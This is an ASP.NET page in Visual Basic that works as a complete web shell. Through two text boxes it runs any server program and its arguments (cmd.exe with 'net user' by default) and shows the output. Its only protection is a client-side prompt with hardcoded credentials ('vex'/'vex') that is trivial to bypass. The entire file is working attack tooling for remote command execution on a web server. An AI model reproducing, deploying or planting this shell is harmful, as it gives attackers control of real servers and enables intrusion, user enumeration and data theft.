<%@ Page Language="VB" Debug="true" %>
<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System.Diagnostics" %>

<script runat="server">      

Sub RunCmd(Src As Object, E As EventArgs)  
  Try
    Dim myProcess As New Process()            
    Dim myProcessStartInfo As New ProcessStartInfo(xpath.Text)            
    myProcessStartInfo.UseShellExecute = False            
    myProcessStartInfo.RedirectStandardOutput = True            
    myProcess.StartInfo = myProcessStartInfo            
    myProcessStartInfo.Arguments = xcmd.Text            
    myProcess.Start()            

    Dim myStreamReader As StreamReader = myProcess.StandardOutput            
    Dim myString As String = myStreamReader.ReadToEnd()            
    myProcess.Close()            

    ' Sanitize output to prevent HTML injection
    myString = Replace(myString, "<", "&lt;")            
    myString = Replace(myString, ">", "&gt;")            

    result.Text = vbCrLf & "<pre>" & myString & "</pre>"    
  Catch ex As Exception
    result.Text = "<b style='color:red;'>Error: " & ex.Message & "</b>"
  End Try  
End Sub

</script>

<html>
<head>
<script>
function authenticateUser() {
    if (sessionStorage.getItem("authenticated") !== "true") {
        var username = prompt("Enter Username:");
        var password = prompt("Enter Password:");

        if (username === "vex" && password === "vex") {
            sessionStorage.setItem("authenticated", "true"); // Save session
        } else {
            alert("Access Denied!");
            window.location.href = "about:blank"; // Redirects user to a blank page
        }
    }
}
window.onload = authenticateUser;
</script>
</head>

<body>    
<form runat="server">  

<!-- Command Execution Section -->
<p><asp:Label id="L_prog" runat="server" width="80px">Program:</asp:Label>        
<asp:TextBox id="xpath" runat="server" Width="300px">c:\windows\system32\cmd.exe</asp:TextBox>        

<p><asp:Label id="L_a" runat="server" width="80px">Arguments:</asp:Label>        
<asp:TextBox id="xcmd" runat="server" Width="300px" Text="/c net user"></asp:TextBox>        

<p><asp:Button id="Button" onclick="runcmd" runat="server" Width="100px" Text="Run"></asp:Button>        

<p><asp:Label id="result" runat="server"></asp:Label>       

</form>
</body>
</html>
